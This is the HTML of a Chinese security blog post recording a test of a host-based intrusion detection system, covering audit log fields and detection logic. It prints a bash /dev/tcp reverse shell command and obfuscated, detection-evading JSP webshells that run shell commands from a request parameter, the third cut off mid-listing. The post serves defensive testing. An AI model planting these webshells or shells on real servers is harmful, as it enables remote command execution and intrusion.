@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="SeikoSrp">
+
+
+
+
+
+
+<title>HIDS的一次测试记录 | a blog</title>
+
+
+
+    <link rel="icon" href="/haidao.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+    <script src="/js/jquery.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+    <script>
+    function searchToggle() {
+        const width = $(document.body).width()
+        if(width > 479) {
+            return;
+        }
+        const search = $('.search');
+        const searchForm = $('.form-search');
+        const menuToggle = $('.menu-toggle');
+        const title = $('.navbar-header-title');
+
+        if(!search.hasClass("mobile-search")) {
+            search.addClass("mobile-search");
+            menuToggle.addClass("open-search")
+            title.addClass("mobile-title-hidden")
+        } else {
+            search.removeClass("mobile-search");
+            menuToggle.removeClass("open-search")
+            // title.css({visibility: 'visible'})
+            title.removeClass("mobile-title-hidden")
+        } 
+    }
+
+    function search(searchInputEl, formEl, flag) {
+        const path = "/" + "search.json"; // 可以在public 下查看这个search.json
+        $(formEl).submit(function(e){
+            e.preventDefault();
+            let target = null
+            if(searchInputEl == null) {
+                const screenWidth = $(document.body).width();
+                target = screenWidth > 479 ? $('#pc-search-input') : $('#mobile-search-input');
+                console.log(target);
+            } else {
+                target = $(searchInputEl)
+            }
+
+            if(!flag && target.val() === '') {
+                return ;
+            }
+
+            $("#u-search").fadeIn(500, function() {
+                $("body > .wrapper").addClass("modal-active");
+
+                $.ajax({
+                    url: path,
+                    dataType: "json",
+                    beforeSend: function (xhr) {
+                        $input = target.val();
+                        $(".form-input").val($input);
+                        const loadingBar = $('.search-loading-bar') 
+                        loadingBar.css({
+                            width:'100%',
+                            display: 'block'
+                        });
+                    },
+                    success: function( datas ) {
+                        // console.log(datas);
+                        const $resultPanel = $(".modal-body")[0];
+                        let str = `<ul class="modal-results">`;
+                        var keywords = $(".form-input").val().trim().toLowerCase().split(/[\s\-]+/);
+                        $resultPanel.innerHTML = "";
+                        let hasResult = false
+                        let text = `<div class="no-result">找不到与关键词相关的内容....</div>`;
+
+                        if ($(".form-input").val().trim().length <= 0) {
+                            // 没有结果
+                            $resultPanel.innerHTML = text;
+                            return;
+                        }
+                        datas.forEach(function (data) {
+                            var isMatch = true;
+                            if (!data.title || data.title.trim() === '') {
+                                data.title = "Untitled";
+                            }
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty contents
+                            if (data_content !== '') {
+                                keywords.forEach(function (keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        hasResult = true
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            } else {
+                                isMatch = false;
+                            }
+                            // show search results
+                            if (isMatch) {
+                                str += `<li class='result-item'><a href='${data_url}' class='result-item-detail'> <span class="title">${data_title}</span>`;
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 200 characters
+                                    var start = first_occur - 40;
+                                    var end = first_occur + 160;
+
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+
+                                    if (start == 0) {
+                                        end = 200;
+                                    }
+
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+
+                                    var match_content = content.substring(start, end);
+
+                                    // highlight all keywords
+                                    keywords.forEach(function (keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, `<em class="search-keyword">${keyword}</em>`);
+                                    });
+
+                                    str += `<span class="content"> ${match_content} ...</span></a>`;
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        if(hasResult) {
+                            $resultPanel.innerHTML = str;
+                        } else {
+                            $resultPanel.innerHTML = text;
+                        }
+
+                    },
+                    complete: function() {
+                        setTimeout(() => {
+                                const loadingBar = $('.search-loading-bar') 
+                                loadingBar.css({
+                                    width:'0%',
+                                    display: 'none'
+                                });
+                        }, 300)
+                    }
+                });
+            })
+
+        });
+    }
+
+    $(document).ready(function() {
+        $('.modal-close').click(function () { 
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+
+        $('.modal-overlay').click(function() {
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+        search(null, ".form-search", false)
+        search("#u-search-modal-form .form-input", ".u-search-modal-form", true)
+    })
+</script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+<!-- Chic/layout.ejs -->
+ <div id="u-search">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="container">
+                    <form id="u-search-modal-form" class="u-search-modal-form">
+                        <button type="submit" class="form-submit-btn">
+                            <img src="/image/search.png" class="search-btn-img" />
+                        </button>
+                        <input placeholder="搜索文章。。。" class="form-input" id="modal-form-input">
+                    </form>
+                    <a class="modal-close">x</a>
+                </div>
+                <div class="search-loading">
+                    <div class="search-loading-bar"></div>
+                </div>
+            </div>
+            <div class="modal-body">
+                <!-- ul 格式如下 -->
+                <!-- <ul class="modal-results">
+                    <li class="result-item">
+                        <a class="result-item-detail">
+                            <span class="title">页面配置</span>
+                            <span class="content">
+                                content
+                            </span>
+                        </a>
+                    </li>
+                </ul> -->
+            </div>
+        </div>
+        <div class="modal-overlay"></div>
+    </div>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">SeikoSrp&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                <!-- 这里表示的是pc端搜索框 -->
+                
+                
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章" autocomplete="off" id="pc-search-input"/>
+        </form>
+    </div>
+
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">SeikoSrp&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="navbar-mobile-right">
+                    
+                    
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章" autocomplete="off" id="mobile-search-input"/>
+        </form>
+    </div>
+
+                    <div class="menu-toggle" onclick="mobileBtn()">&#9776; 目录</div>
+                </div>
+                
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">前往底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部折叠"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">HIDS的一次测试记录</h1>
+            
+                <div class="post-meta">
+                    
+                        作者: <a itemprop="author" rel="author" href="/">SeikoSrp</a>
+                    
+
+                    
+                        <span class="post-time">
+                        发布于: <a href="#">十二月 18, 2020&nbsp;&nbsp;18:47:41</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    分类:
+                            
+                                <a href="/categories/RedTeam-%E5%9F%9F%E5%AE%89%E5%85%A8/">RedTeam&域安全</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此前没有接触过HIDS，主要做的是NIDS也就是流量检测方面的内容，手头上拿到了一个刚刚开发的HIDS项目（主要是将一些其他的开源项目拼在了一起，还没开始具体完善），所以做了一些研究和测试，算是比较基础的内容，不过可以借此了解HIDS的构造原理等知识。</p>
+<h2 id="HIDS的简介"><a href="#HIDS的简介" class="headerlink" title="HIDS的简介"></a>HIDS的简介</h2><p>HIDS全称是Host-based Intrusion Detection System，即基于主机型入侵检测系统。对应的还有NIDS（Network Intrusion Detection System）网络入侵检测系统。从名称中即可得知，NIDS的主要数据来源是网络流量，而HIDS的主要数据来源是来至于主机本身产生的各种审计信息。主要通过agent收集日志信息进行分析。</p>
+<p>下面几个是网上收集的几个HIDS的框架图：</p>
+<h3 id="OSQuery"><a href="#OSQuery" class="headerlink" title="OSQuery"></a>OSQuery</h3><p><img src="https://image.3001.net/images/20191217/1576556354_5df857424123b.png!small" alt="img"></p>
+<h3 id="YSRC-驭龙-HIDS"><a href="#YSRC-驭龙-HIDS" class="headerlink" title="YSRC 驭龙 HIDS"></a>YSRC 驭龙 HIDS</h3><p><img src="https://github.com/ysrc/yulong-hids/raw/master/docs/jg.png" alt="img"></p>
+<h3 id="美团分布式HIDS"><a href="#美团分布式HIDS" class="headerlink" title="美团分布式HIDS"></a>美团分布式HIDS</h3><p><img src="https://p1.meituan.net/travelcube/f7ee684a6ad73e9418451d52576288a3105802.png" alt="hids-cluster-architecture"></p>
+<p>可以看到都是通过agent收集日志，然后开发日志分析规则进行分析。</p>
+<h2 id="检测原理"><a href="#检测原理" class="headerlink" title="检测原理"></a>检测原理</h2><h3 id="Webshell文件"><a href="#Webshell文件" class="headerlink" title="Webshell文件"></a>Webshell文件</h3><p>Webshell主要是结合了网上开源的一些YARA规则对样本进行正则匹配。</p>
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h4 id="Audit"><a href="#Audit" class="headerlink" title="Audit"></a>Audit</h4><p>远程命令执行通过Linux下的Audit审计工具的日志进行检测</p>
+<p><img src="HIDS.assets/image001.png" alt="image001"></p>
+<p>实线代表的是数据流，虚线代表的是组件之间的控制关系。audit是内核中的一个模块，通过守护进程audit获取内核中产生的数据，由其他的 auditd、audispd、auditctl、autrace、ausearch 和 aureport 等应用程序进行存储分析等操作。不同的应用程序的作用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">auditctl : 即时控制审计守护进程的行为的工具，如添加规则等。</span><br><span class="line">auditd ：audit 守护进程负责把内核产生的信息写入到硬盘上，这些信息由应用程序和系统活动触发产生。用户空间审计系统通过 auditd 后台进程接收内核审计系统传送来的审计信息，将信息写入到 &#x2F;var&#x2F;log&#x2F;audit&#x2F;audit.log。</span><br><span class="line">aureport : 查看和生成审计报告的工具。</span><br><span class="line">ausearch : 查找审计事件的工具</span><br><span class="line">auditspd : 转发事件通知给其他应用程序，而不是写入到审计日志文件中。</span><br><span class="line">autrace : 一个用于跟踪进程的命令。类似于 strace，跟踪某一个进程，并将跟踪的结果写入日志文件之中。</span><br></pre></td></tr></table></figure>
+
+<p>HIDS就是通过分析audit产生的日志来判断是否存在远程命令执行。更多详情可以参考<a href="https://www.ibm.com/developerworks/cn/linux/l-lo-use-space-audit-tool/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/l-lo-use-space-audit-tool/index.html</a></p>
+<h4 id="Audit日志格式"><a href="#Audit日志格式" class="headerlink" title="Audit日志格式"></a>Audit日志格式</h4><p>一条原始的Audit日志：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(1584596604.534:130765): arch&#x3D;c000003e syscall&#x3D;59 success&#x3D;yes exit&#x3D;0 a0&#x3D;1b198e0 a1&#x3D;1b13fc0 a2&#x3D;1b13b60 a3&#x3D;7ffd3bcb4820 items&#x3D;2 ppid&#x3D;9316 pid&#x3D;9319 auid&#x3D;4294967295 uid&#x3D;0 gid&#x3D;0 euid&#x3D;0 suid&#x3D;0 fsuid&#x3D;0 egid&#x3D;0 sgid&#x3D;0 fsgid&#x3D;0 tty&#x3D;(none) ses&#x3D;4294967295 comm&#x3D;&quot;grep&quot; exe&#x3D;&quot;&#x2F;usr&#x2F;bin&#x2F;grep&quot; key&#x3D;(null)</span><br></pre></td></tr></table></figure>
+
+<p>其中每个字段的含义为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">type&#x3D;SYSCALL</span><br><span class="line">　　每条记录都是以type&#x3D;&quot;keyword&quot;开头，SYSCALL表示这条记录是向内核的系统调用触发产生的。更详细的type值和解释可以参考：https:&#x2F;&#x2F;access.redhat.com&#x2F;documentation&#x2F;en-us&#x2F;red_hat_enterprise_linux&#x2F;7&#x2F;html&#x2F;security_guide&#x2F;sec-Audit_Record_Types</span><br><span class="line"></span><br><span class="line">msg&#x3D;audit(1584596604.534:130765)</span><br><span class="line">　　在audit(time_stamp:ID)格式中，记录时间戳，从1970年1月1日00:00:00到现在的时间，ID为记录中唯一的ID标识，同一个事件产生的ID是相同的，如上访问audit_test目录会触发产生三条日志，但是事件ID是相同的。</span><br><span class="line"></span><br><span class="line">arch&#x3D;c000003e</span><br><span class="line">　　表示系统的CPU架构，这个十六进制表示”x86_64“，使用命令ausearch -i --arch c000003e可以打印出有这部分内容的audit.log中日志的解释。需要注意的是，使用ausearch来查询时，需要保证audit log中有这样的日志记录。</span><br><span class="line"></span><br><span class="line">syscall&#x3D;59</span><br><span class="line">　　向内核的系统调用的类型，类型值为59，在&#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd_64.h中有定义，可以通过ausyscall查询代表的类型</span><br></pre></td></tr></table></figure>
+
+<p><img src="HIDS.assets/image-20200319151851705.png" alt="image-20200319151851705"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">success&#x3D;yes</span><br><span class="line">　　表示系统调用成功与否</span><br><span class="line">　　</span><br><span class="line">exit&#x3D;3</span><br><span class="line">　　系统调用结束时的返回码，可以使用如下命令来查看返回值为0的日志解释，不同的系统调用，返回值不同。</span><br><span class="line">#ausearch --interpret --exit 0</span><br><span class="line"></span><br><span class="line">a0&#x3D;1b198e0 a1&#x3D;1b13fc0 a2&#x3D;1b13b60 a3&#x3D;7ffd3bcb4820</span><br><span class="line">　　为系统调用时的前四个arguments，这些arguments依赖于使用的系统调用，可以使用ausearch来查看解释（部分参数可以打印出数值具体的解释）。</span><br><span class="line"></span><br><span class="line">items&#x3D;1</span><br><span class="line">　　表示跟在系统调用后，补充记录的个数。</span><br><span class="line"></span><br><span class="line">ppid&#x3D;9316</span><br><span class="line">　　父进程ID，如bash的ID。</span><br><span class="line"></span><br><span class="line">pid&#x3D;9319</span><br><span class="line">　　进程Id，即为进程的ID。</span><br></pre></td></tr></table></figure>
+
+<p>这里命令执行测试的是通过Web服务执行命令时的检测情况，会触发type=EXECVE类型的Audit日志（下文会提到）。</p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>常规的反弹shell比如nc、bash进行反弹shell都会产生tcp连接，从而触发规则，例如：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="HIDS.assets/image-20200326164235284.png" alt="image-20200326164235284"></p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h3><p>Webshell文件使用了几个Git上提供的免杀的小马：<a href="https://github.com/LandGrey/webshell-detect-bypass/tree/master/webshell/jsp" target="_blank" rel="noopener">https://github.com/LandGrey/webshell-detect-bypass/tree/master/webshell/jsp</a></p>
+<h4 id="小马1："><a href="#小马1：" class="headerlink" title="小马1："></a>小马1：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Scanner"</span> pageEncoding=<span class="string">"UTF-8"</span> %&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;title&gt;Just For Fun&lt;/title&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;H3&gt;Build By LandGrey&lt;/H3&gt;</span><br><span class="line">&lt;FORM METHOD=POST ACTION=<span class="string">'#'</span>&gt;</span><br><span class="line">    &lt;INPUT name=<span class="string">'q'</span> type=text&gt;</span><br><span class="line">    &lt;INPUT type=submit value=<span class="string">'Fly'</span>&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getPicture</span><span class="params">(String str)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String fileSeparator = String.valueOf(java.io.File.separatorChar);</span><br><span class="line">        <span class="keyword">if</span>(fileSeparator.equals(<span class="string">"\\"</span>))&#123;</span><br><span class="line">            str = <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123;<span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">32</span>&#125;) + str;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            str =  <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123;<span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">99</span>, <span class="number">32</span>&#125;) + str;</span><br><span class="line">        &#125;</span><br><span class="line">        Class rt = Class.forName(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span> &#125;));</span><br><span class="line">        Process e = (Process) rt.getMethod(new String(new byte[] &#123; 101, 120, 101, 99 &#125;), String.class).invoke(rt.getMethod(new String(new byte[] &#123; 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 &#125;)).invoke(null, new Object[]&#123;&#125;),  new Object[] &#123; str &#125;);</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(e.getInputStream()).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">        String result = <span class="string">""</span>;</span><br><span class="line">        result = sc.hasNext() ? sc.next() : result;</span><br><span class="line">        sc.close();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String name =<span class="string">"Input Nothing"</span>;</span><br><span class="line">    String query = request.getParameter(<span class="string">"q"</span>);</span><br><span class="line">    <span class="keyword">if</span>(query != <span class="keyword">null</span>) &#123;</span><br><span class="line">        name = getPicture(query);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;%= name %&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="小马2："><a href="#小马2：" class="headerlink" title="小马2："></a>小马2：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Scanner"</span> %&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;title&gt;Just For Fun&lt;/title&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;H3&gt;Build By LandGrey&lt;/H3&gt;</span><br><span class="line">&lt;FORM METHOD=<span class="string">"POST"</span> NAME=<span class="string">"form"</span> ACTION=<span class="string">"#"</span>&gt;</span><br><span class="line">    &lt;INPUT TYPE=<span class="string">"text"</span> NAME=<span class="string">"q"</span>&gt;</span><br><span class="line">    &lt;INPUT TYPE=<span class="string">"submit"</span> VALUE=<span class="string">"Fly"</span>&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String op=<span class="string">"Got Nothing"</span>;</span><br><span class="line">    String query = request.getParameter(<span class="string">"q"</span>);</span><br><span class="line">    String fileSeparator = String.valueOf(java.io.File.separatorChar);</span><br><span class="line">    Boolean isWin;</span><br><span class="line">    <span class="keyword">if</span>(fileSeparator.equals(<span class="string">"\\"</span>))&#123;</span><br><span class="line">        isWin = <span class="keyword">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        isWin = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (query != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ProcessBuilder pb;</span><br><span class="line">        <span class="keyword">if</span>(isWin) &#123;</span><br><span class="line">            pb = <span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>&#125;), <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">47</span>, <span class="number">67</span>&#125;), query);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            pb = <span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">104</span>&#125;), <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">45</span>, <span class="number">99</span>&#125;), query);</span><br><span class="line">        &#125;</span><br><span class="line">        Process process = pb.start();</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(process.getInputStream()).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">        op = sc.hasNext() ? sc.next() : op;</span><br><span class="line">        sc.close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;PRE&gt;</span><br><span class="line">    &lt;%= op %&gt;&gt;</span><br><span class="line">&lt;/PRE&gt;</span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="小马3："><a href="#小马3：" class="headerlink" title="小马3："></a>小马3：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page pageEncoding=<span class="string">"UTF-8"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.List"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Scanner"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.ArrayList"</span> %&gt;</span><br><span 